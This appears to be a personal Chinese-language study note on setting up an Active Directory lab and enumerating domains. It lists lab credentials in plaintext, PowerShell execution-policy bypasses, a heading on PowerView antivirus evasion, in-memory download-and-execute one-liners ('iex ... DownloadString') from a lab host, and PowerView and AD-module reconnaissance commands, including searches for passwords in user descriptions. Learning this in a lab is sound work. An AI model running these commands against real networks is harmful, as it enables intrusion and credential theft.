拿到用户名，想到暴力破解，试试RPC，试试Kerbrute，找到一组用户名试试AS-REP Roasting攻击(UF_DONT_REQUIRE_PREAUTH)，尝试











ds-DC01 [10.10.10.10]

ip: 10.10.10.10

user name: Administrator

password: My@Pass123

域名：desyncsec.lab

DSRM密码：My@Pass123



hk-DC01 [10.10.10.11]

ip: 10.10.10.11

user name: Administrator

password: My@Pass123

域名：hk.desyncsec.lab

DSRM密码：My@Pass123



用户：

desyncsec\john:angel@Pass123!



子域用户：

hk\angel:john@Pass123!

hk\ruky:john@Pass123!





Alice:john@Pass123!

关闭自动更新

```
cmd.exe
sconfig
5
m
15
```

打开系统设置

```
control 打开控制中心
System and Security -> System -> change settings -> change -> 修改为ds-DC01

win+r sysdm.cpl
```

打开网络设置

```
ncpa.cpl -> properities
```

确认域和森林的功能级别

```
powershell
Get_ADDomain | fl name,DomainMode
Get_ADForest | fl name,ForestMode
```

打开活动目录管理中心

```
dsac.exe
```

子域和父域互ping

```
ping hk.desyncsec.lab #ping子域
ping desyncsec.lab #ping父域
netdom query fsmo
```

![image-20250329211113432](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250329211113432.png)

将主机加入域

```

```

查看你对应域的具体用户的信息(不能从父域看子域的用户，也不能从子域看父域的用户)

```
net user john /domain
```

启动远程桌面连接

```
win+r
mstsc
```

把用户添加到远程连接用户

```
cmd终端，不能使用server系统，需要使用administrator
compmgmt.msc -> local users and groups -> Group -> Remote Desktop users -> add 

net localgroup "Remote Desktop Users" hk\rto /add
```

![image-20250329213532825](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250329213532825.png)

离开域

```
cmd: sysdm.cpl -> Workgroup(WORKGROUP)
powershell(需要管理员权限): remove-computer -UnjoindomainCredential hk\administrator -PassThru -Verbose -Restart
```





### ==**用户和组**==

```
图形化界面： Server Manager > Dashboard > tools > AD Users and Computer

命令行：powershell: net user user02 Passw0rd02 /add /domain #无法设置特殊属性

Active Directory Module for Windows Powershell: New-ADUser -Name "user02" -Description "Used for test,create by cxh" -EmailAddress "user02@desyncsec.com" -AccountPassword(Read-Host -AsSecureString "Type Password For User:")默认是禁用的
```



### **==组策略==**

Group Policy Management: `gpmc.msc`

![image-20250330150916875](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250330150916875.png)

打开共享目录管理器：cmd: `fsmgmt.msc`

查看共享目录是否可以访问：cmd: `dir \\hk-DC01\sysvol`

默认对于普通的域内主机和用户：90分钟更新一次

域控制器：5分钟更新一次

手动更新：`gpupdate /force`

查看日志：win+r -> `eventvwr.msc`





### **==Windows共享==**

![image-20250330160353436](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250330160353436.png)

建立共享：cmd:`net share myshare=c:\myshare /grant:everyone,read`

删除共享：cmd:`net share myshare /delete`





### **==域环境信息收集==**

**==Active Directory枚举==**

![image-20250330164217986](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250330164217986.png)

```
Powershell介绍：

1.Powershell并不是powershell.exe，而是System.Management.Automation.dll

2.Powershell基于 `.NET` 框架，和Windows紧密集成

3.提供对Windows系统和活动目录环境几乎所有信息的访问

4.可完全从内存中执行Powershell脚本

5.类似于linux下的bash

使用 . 加载Powershell脚本
. C:\Tools\PowerView.ps1

使用Import-Module命令导入模块或者脚本
Import-Module C:\Tools\ActiveDirectory\ActiveDirectory.psd1

列出模块中所有的命令
Get-Command -Module<modulename>
```

**==powershell执行策略==**

```
powershell执行策略不是安全机制，主要是为了防止用户意外地执行脚本
绕过：

powershell -ExecutionPolicy bypass
powershell -c <cmd>
powershell -encodedcommand
$env:PSExecutionPolicyPreference="bypass"

default:
windows client: Restricted，可以执行单个powershell命令，但是不可以执行任何脚本（.ps1,.ps1xml,.psml）
windows server: RemoteSigned 在互联网下载的脚本需要签名，本地编写的不需要签名
```



设置bypass：`powershell -ep bypass`



```
$env:PsExecutionPolicyPreference="bypass"
.\hello.ps1
```

![image-20250330181316542](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250330181316542.png)

还可以用：`powershell -c 'Write-Host "Hello world!"'`绕过powershell的执行策略

![image-20250330193647809](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250330193647809.png)

还可以用：`powershell -h`

![image-20250330193921394](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250330193921394.png)

系统全局的执行策略设置：`Set-ExecutionPolicy`



**==powershell脚本执行==**

![image-20250330194108731](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250330194108731.png)

查看powershell的版本：`$PSVersiontable.PsVersion`

![image-20250330194336627](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250330194336627.png)



`iex (New-Object Net.WebClient).DownloadString("http://10.10.10.12/PowerView.ps1")`

`Get-DomainUser -Identity angel`

![image-20250331210308752](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250331210308752.png)

`iex (iwr 'http://10.10.10.12/PowerView.ps1')`

`Get-domainuser -identity ruky`

![image-20250331210529386](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250331210529386.png)

`$wr = [System.NET.WebRequest]::Create('http://10.10.10.12/PowerView.ps1')`

`$r = $wr.GetRequest()`

`iex ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()`

`Get_domainUser angel`

![image-20250331211532653](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250331211532653.png)



#### **==powerview免杀==**

![image-20250331211841019](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250331211841019.png)

![image-20250331213322456](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250331213322456.png)

![image-20250331214703302](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250331214703302.png)

这里搞不了一点，首先连不上网，其次我都下载不下来





==**域渗透 win原生工具**==

查看当前用户：`whoami`

查看用户的upn名称：`whoami /upn`

查看用户的组：`whoami /groups`

查看当前用户的权限：`whoami /priv`

查看与控制器：`nltest /dclist:`

查看本地管理员：`net localgroup administrators`

查看当前主机有没有加入域：`net config workstation` 

​						`ipconfig /all` 

​						`net user angel /domain`

查看所有的组：`net group /domain`

查看域内的用户：`net user /domain`

枚举指定组的成员：`net group "Domain Computers" /domain`

查看域控制器： `net group "Domain Controllers" /domain`

查看域管理员组的用户：`net group "Domain Admins" /domain`

查看企业管理员组：`net group "Enterprise Admins" /domain` 要在根域查看

查看哪些域信任当前域：`nltest /trusted_domains`

查看当前域信任哪些域：`nltest /domain_trusts /all_trusts`

查看当前域的账号策略：`net accounts`





==**域信息枚举**==

```
使用PowerView.ps1
powershell

. .\PowerView.ps1
Get-Domain
Get-Domain -Domain desyncsec.lab #查看父域的信息
Get-DomainSID #查看当前域的SID信息
Get-DomainPolicyData #枚举当前域的域策略
(Get-DomainPolicyDate).systemaccess #只关注密码相关的策略
(Get-DomainPolicyData -Domain desyncsec.lab).systemaccess #枚举其他域的域策略
(Get-DomainPolucyData -Domain desyncsec.lab).KerberosPolicy #查看父域kerberos相关的策略
Get-DomainController #枚举当前域控制器的信息
Get-DomainController | select name,IPaddress,Sitename #只查看name,IPaddress,Sitename
Get-DomainController -Domain desyncsec.lab | select name,IPaddress,Sitename #用-Domain指定域
Get-DomainUser #枚举当前域，用户的信息，返回所有用户的信息
Get-DomainUser > user.txt #把输出重定向到user.txt文件
Get-DomainUser -Identity rto #查看指定用户
Get-DomainUser -Properites name,pwdlastset #查看用户的名字和最后一次修改密码的时间
Get-DomainUser -LDAPFilter "Description=*pass*" | select Name,Description #在Properites中匹配前后缀有pass的关键字
Get-DomainComputer | select name #查看域内的主机名
Get-DomainComputer -OperatingSystem "Windows Server 2019 Standard Evaluation" #过滤操作系统
Get-DomainComputer -OperatingSystem "Windows Server 2019 Standard Evaluation" | select name #查看名称
Get-DomainComputer -OperatingSystem "Windows Server 2019 Standard Evaluation" -Ping #探测主机的重合性
Get-DomainGroup | select name #查看所有组的信息
Get-DomainGroup -Domain desyncsec.lab | select name #查看父域的组名
Get-DomainGroup *admin* #只关注组名只有admin关键字的组
Get-DomainGroupMember -Identity "Domain Admins" -Recurse   #枚举域管理员组的所有成员
Get-DomainGroup -Username rto | select name #给定的用户是哪些组的成员
Get-NetLocalGroup -ComputerName hk-dc01    #查看域控所有的本地组
Get-NetLocalGroupMember -Computer hk-DC01  #某一台主机所有本地组的成员，默认查找administrator这个本地组的成员
Get-NetLocalGroupMember -Computer hk-DC01 -GroupName "Remote Desktop Users" #查看RDP这个远程桌面组的成员
```

```
使用ActiveDirectoryPowershell
powershell

import-module .\Microsoft.ActiveDirectory.Management.dll
Import-module .\ActiveDirectory.psd1
Get-ADDomain
Get-ADDomain -Identity desyncsec.lab #查看父域的信息
(Get-ADDomain -Identity desyncsec.lab).DomainSID #查看父域的SID信息
(Get-ADDomain).DomainSID 
Get-ADDomainController #查看当前域控制器的信息，默认返回最近的域控
Get-ADDomainController -Filter * #查看全部的域控信息
Get-ADDomainController -Filter * | select name,IPv4Address #也可以用select进行过滤
Get-ADDomainController -DomainName desyncsec.lab -Discover #使用-DomainName，指定域
Get-ADUser -Filter * -Properites * #查看当前域，所有用户信息，可以返回大量的信息
Get-ADUser -Identity rto #查看rto的信息
Get-ADUser -Identity rto -Properites #查看rto所用属性的信息
Get-ADUser -Filter * -Properites * | select -Filter 1 | Get-Member -MemberType *Property | select Name #想查看用户User这个对象所有的属性
Get-ADUser -Filter * -Properties * | select name,@{expression={[datetime]::fromFileTime($_.pwdlastset)}} #查看用户的名字和最后一次修改密码的时间
Get-ADUser -Filter '"Description -like *pass*"' -Properites Description | select name,Description
Get-ADComputer -Filter * | select Name #查看主机名
Get-ADComputer -Filter 'OperatingSystem -like "*Windows Server 2019 Standard*"' -Properies OperatingSystem | select Name,OperatingSystem
Get-ADComputer -Filter * -Properties DNSHostName | %{Test-Connection -Count 1 -ComputerName $_.DNSHostName}
Get-ADComputer -Filter * -Properties * #查看域内所有主机的所有属性
Get-ADGroup -Filter * | select Name #查看所有组的组名
Get-ADGroup -Filter * -Properites * #查看所有组的所有属性信息
Get-ADGroup -Filter "Name -like '*admin*'" | select name #只关注组名只有admin关键字的组
Get-ADGroup -Identity "Domain Admins" -Recursive  #枚举域管理员组的所有成员
Get-ADGroup -Identity "Domain Admins" -Recursive | Foreach-Object {Get-ADObject $_ -Properities *} #查看域管理员组管理员的所有属性
Get-ADPrincipalGroupMembership -Identity rto #查看rto是哪个组的成员
Get-ADPrincipalGroupMembership -Identity rto | select name #过滤组名
```

